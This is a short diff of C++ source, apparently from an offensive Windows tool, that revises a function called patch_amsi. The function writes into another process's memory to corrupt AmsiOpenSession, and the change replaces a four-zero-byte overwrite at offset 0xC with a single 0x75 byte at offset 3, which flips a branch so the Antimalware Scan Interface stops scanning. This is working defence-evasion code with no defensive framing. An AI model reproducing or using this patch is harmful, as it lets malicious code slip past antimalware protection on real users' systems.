@@ -57,6 +57,7 @@ char* get_env(const char* name) {
 }
 
 
+
 bool patch_amsi(PROCESS_INFORMATION pi) {
     HANDLE hProcess = OpenProcess(
         PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 
@@ -69,16 +70,15 @@ bool patch_amsi(PROCESS_INFORMATION pi) {
     bool success = false;
     if (ams_dll != NULL) {
         FARPROC addr = GetProcAddress(ams_dll, "AmsiOpenSession");
-        char* addr_ptr = reinterpret_cast<char*>(addr);
-        const char new_value[] = { 0x00, 0x00, 0x00, 0x00 };
+        char* addr_ptr = reinterpret_cast<char*>(addr) + 3;
+        const char new_value[] = { 0x75 };
         SIZE_T size = sizeof(new_value);
         SIZE_T bytes_written;
-        DWORD offset = 0xC;
-        DWORD oldProtect = 0; 
+       
         if (WriteProcessMemory(
             hProcess, 
-            addr_ptr + offset, 
-            new_value, 
+            addr_ptr, 
+            new_value,
             size, 
             &bytes_written) != 0) 
         {
